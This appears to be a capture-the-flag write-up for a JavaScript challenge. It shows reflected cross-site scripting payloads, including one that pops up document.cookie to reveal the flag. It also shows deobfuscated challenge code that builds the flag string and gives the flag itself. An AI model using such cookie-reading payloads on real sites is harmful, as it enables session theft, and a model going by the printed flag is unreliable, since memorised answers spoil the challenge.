## we have search functionality with cookie `try+to+execute+some+js+`
![Screenshot 2023-08-11 at 01-09-41 Javascript](https://github.com/kiro6/writeups-ctfs/assets/57776872/8eaa29e0-40ea-4dbf-a31c-a7bb7853bdba)

## i tried this payload , as we can see the ` </script>` which i entered is parsed as a part of the code
```js
<script>alert(1)</script>
```
![Screenshot_20230811_010557](https://github.com/kiro6/writeups-ctfs/assets/57776872/fe55a717-fc98-4e3b-ae6e-13f4117b6c60)


## so i used this 
```js
<script>alert(1)</script><script>alert(document.cookie)</script>
```
![Screenshot_20230811_010607](https://github.com/kiro6/writeups-ctfs/assets/57776872/1f5f32ec-7b42-45d9-8893-9dd2defecd2b)

## there is the flag
```
coolcookie112
```

## another solution there was obfuscated js code  , i deobfuscate it using [this site](http://deobfuscatejavascript.com/) , there was the part where the flag is constructed
```js

            var f = '';
            f += ([]["fill"] + "")[3];
            f += (true + []["fill"])[10];
            f += (true + []["fill"])[10];
            f += (false + "")[2];
            f += ([]["fill"] + "")[3];
            f += (true + []["fill"])[10];
            f += (true + []["fill"])[10];
            f += (+(20))["to" + String["name"]](21);
            f += ([false] + undefined)[10];
            f += (true + "")[3];
            f += "112";
            eraseCookie('flag');
            createCookie('flag', f, 1);
            legacyAlert(p)
      
```
![Screenshot_20230811_011416](https://github.com/kiro6/writeups-ctfs/assets/57776872/9c7da9e1-b794-4d71-ab91-12bd37884d98)
